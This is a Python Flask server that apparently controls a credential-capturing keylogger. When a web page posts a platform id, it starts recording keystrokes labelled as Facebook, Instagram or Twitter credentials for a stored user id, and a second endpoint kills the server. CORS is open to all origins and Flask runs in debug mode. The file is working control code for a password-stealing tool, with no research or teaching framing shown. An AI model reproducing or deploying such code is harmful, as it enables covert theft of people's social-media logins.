import os
from dotenv import dotenv_values

from flask import Flask, jsonify, request
from flask_cors import CORS
from tools.keylogger import Keylogger
from base.displayer import CredentialType
config = dotenv_values(".env")
user_id = config['FP_USER_ID']
print("Loaded user id is:", user_id)
app = Flask(__name__)
CORS(app)
@app.route('/start-server', methods=['POST'])
def start_server():
    # Create a class instance
    print("recieved start recording request from page")
    data = request.get_json()
    platform_id = str(data.get('platform_id'))
    print("Platform id in request is:", platform_id)
    my_instance = Keylogger(user_id)
    if platform_id == "0":
        my_instance.start_recording(CredentialType.FACEBOOK, int(user_id))
    elif platform_id == "1":
        my_instance.start_recording(CredentialType.INSTAGRAM, int(user_id))
    elif platform_id == "2":
        my_instance.start_recording(CredentialType.TWITTER, int(user_id))

    return jsonify({'message': "200"})
@app.route('/end-server', methods=['POST'])
def end_server():
    # When the server receives a request to this endpoint it indicates that the user is
    # finished and we should kill the Keylogger if it is running
    # TODO: rather than killing the server itself, I would rather have the Keylogger as a seperate process that the server
    #       starts and then just kill that
    os.system('kill %d' % os.getpid())
    return jsonify({'message': "200"})
if __name__ == '__main__':
    app.run(debug=True)
